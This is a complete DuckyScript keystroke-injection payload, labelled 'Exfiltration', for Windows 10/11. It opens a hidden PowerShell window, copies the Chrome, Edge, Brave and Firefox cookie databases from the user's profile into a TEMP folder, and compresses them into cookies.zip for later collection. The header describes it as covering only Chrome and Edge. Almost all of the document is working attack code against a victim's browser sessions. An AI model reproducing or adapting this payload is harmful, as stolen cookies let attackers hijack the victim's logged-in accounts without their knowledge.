REM Author: UNC0V3R3D
REM Description: Copies Chrome and Edge cookie databases to TEMP for offline analysis.
REM Version: 1.0
REM Category: Exfiltration
REM Target: Windows 10/11
REM Requirements: Browsers not running (cookies DB is locked when browser is open)
DELAY 1000
GUI r
DELAY 700
STRING powershell -windowstyle hidden
ENTER
DELAY 1500
STRING $dst = "$env:TEMP\cookies_dump"; New-Item -ItemType Directory -Path $dst -Force | Out-Null
ENTER
DELAY 400
STRING $chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
ENTER
STRING $edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
ENTER
STRING $brave = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
ENTER
STRING $firefox = "$env:APPDATA\Mozilla\Firefox\Profiles"
ENTER
STRING foreach ($src in @($chrome,$edge,$brave)) { if (Test-Path $src) { $name = ($src -split '\\')[-3]; Copy-Item $src "$dst\${name}_Cookies" -Force -EA SilentlyContinue } }
ENTER
STRING if (Test-Path $firefox) { Get-ChildItem $firefox -Filter 'cookies.sqlite' -Recurse -EA SilentlyContinue | ForEach-Object { Copy-Item $_.FullName "$dst\Firefox_Cookies_$($_.Directory.Name).sqlite" -Force } }
ENTER
DELAY 1000
STRING Compress-Archive -Path $dst -DestinationPath "$env:TEMP\cookies.zip" -Force
ENTER
DELAY 2000
STRING exit
ENTER
REM End of payload
